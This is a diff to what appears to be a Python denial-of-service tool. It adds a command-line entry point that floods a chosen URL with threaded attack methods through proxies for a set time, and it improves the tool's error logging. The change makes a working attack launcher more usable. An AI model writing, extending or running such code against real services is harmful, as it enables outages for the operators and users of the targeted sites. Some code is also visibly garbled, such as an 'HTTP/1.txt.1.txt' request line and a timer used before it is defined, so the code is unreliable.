@@ -1,4 +1,3 @@
-
 import json
 import socket
 import sys
@@ -570,8 +569,8 @@ def start_attack(method, threads, event, socks_type, proxies=None):
         elif method == "pod":
             for _ in range(threads):
                 threading.Thread(target=pod, args=(event, timer), daemon=True).start()
-    except:
-        pass
+    except Exception as e:
+        logger.error(f"Error starting attack: {e}")
 
 
 def random_data():
@@ -1449,3 +1448,35 @@ def slow(conn, socks_type):
     header = Headers("dyn")
     proxy = Choice(proxies).strip().split(":")
     get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 8:
+        print("Usage: python3 start.py <method> <url> <threads> <time> <proxy_file> <timeout> <socks_type>")
+        sys.exit(1)
+
+    method = sys.argv[1]
+    url = sys.argv[2]
+    threads = int(sys.argv[3])
+    attack_time = int(sys.argv[4])
+    proxy_file = sys.argv[5]
+    timeout = int(sys.argv[6])
+    socks_type = int(sys.argv[7])
+
+    # Parse the target URL
+    UrlFixer(url)
+
+    # Initialize event
+    event = threading.Event()
+
+    # Start the attack
+    start_attack(method, threads, event, socks_type)
+
+    # Set the timer
+    timer = time.time() + attack_time
+
+    # Wait for the attack to finish
+    while time.time() < timer:
+        time.sleep(1)
+
+    print("Attack finished!")
